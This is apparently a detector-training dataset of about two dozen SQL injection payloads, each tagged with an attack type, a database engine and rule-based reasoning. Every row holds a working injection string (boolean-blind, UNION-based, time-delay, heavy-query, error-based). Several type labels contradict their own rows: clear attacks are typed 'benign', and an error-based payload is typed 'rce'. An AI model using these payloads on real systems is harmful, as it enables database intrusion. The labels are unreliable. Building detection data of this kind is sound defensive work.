row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3660,1 where 6827 = 6827,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3661,"1"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""dnmi"" like ""dnmi",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
3662,"1 ) where 5465 = 5465 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
3663,"1%' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( '%' = '",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
3664,"1"" ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ""opgb"" like ""opgb",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
3665,"1"" ) ) as ynuw where 9138 = 9138",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3666,"1' where 6147 = 6147 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3667,"1%"" and ( 3020 = 3020 ) *6703 and ""%"" = """,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3668,"-8053"" where 5458 = 5458 or 9323 = 9323#",1,,boolean_blind,generic,0.95,5458 = 5458 or detected — boolean_blind injection (priority 8) on generic,rule-based
3669,"1' ) where 7640 = 7640 and make_set ( 8978 = 8594,8594 ) --",1,,boolean_blind,generic,0.95,7640 = 7640 and detected — boolean_blind injection (priority 8) on generic,rule-based
3670,"-6496"" ) as obnf where 2903 = 2903 or make_set ( 9354 = 9354,7185 ) --",1,,boolean_blind,generic,0.95,2903 = 2903 or detected — boolean_blind injection (priority 8) on generic,rule-based
3671,-1432 order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3672,"1'+ ( select ouhd where 8905 = 8905 and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ) +'",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
3673,select case when 5433 = 6458 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3674,"1' ) where 7093 = 7093 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
3675,"-5058%' union all select 6789,6789,6789,6789,6789#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3676,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( ""%"" = """,1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
3677,"1%"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""%"" = """,1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
3678,-9405' union all select 2539--,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3679,"-7565' ) ) union all select 7745,7745,7745,7745,7745,7745#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3680,select ( case when ( 1272 = 5883 ) then 1272 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3681,"1' ) and make_set ( 4551 = 6487,6487 ) and ( 'jnqa' = 'jnqa",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
3682,"1"" ) where 7723 = 7723 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --",1,,boolean_blind,firebird,0.95,7723 = 7723 and detected — boolean_blind injection (priority 8) on firebird,rule-based
3683,"-3445 union all select 5505,5505,5505--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
